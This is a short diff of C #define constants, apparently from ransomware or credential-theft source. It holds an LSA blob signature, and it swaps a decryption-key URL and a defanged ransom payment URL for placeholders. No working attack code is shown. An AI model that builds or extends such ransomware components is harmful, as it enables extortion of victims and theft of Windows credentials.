@@ -41,8 +41,8 @@
 #define HASH_SIZE 16
 #define LSA_BLOB_SIGNATURE { 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
 #define UNICODE_STRING_MAX_LENGTH 256
-#define DECRYPTION_KEY_URL "https://raw.githubusercontent.com/user/repo/main/decryption_key.bin"
-#define PAYMENT_URL "hxxps://pay.cerberus-collective.com"
+#define DECRYPTION_KEY_URL "link decryption_key"
+#define PAYMENT_URL "link PAYMENT"
 #define HASH_TABLE_SIZE 1009
 #define TOP_HASHES 5
 #define NETWORK_TIMEOUT 50
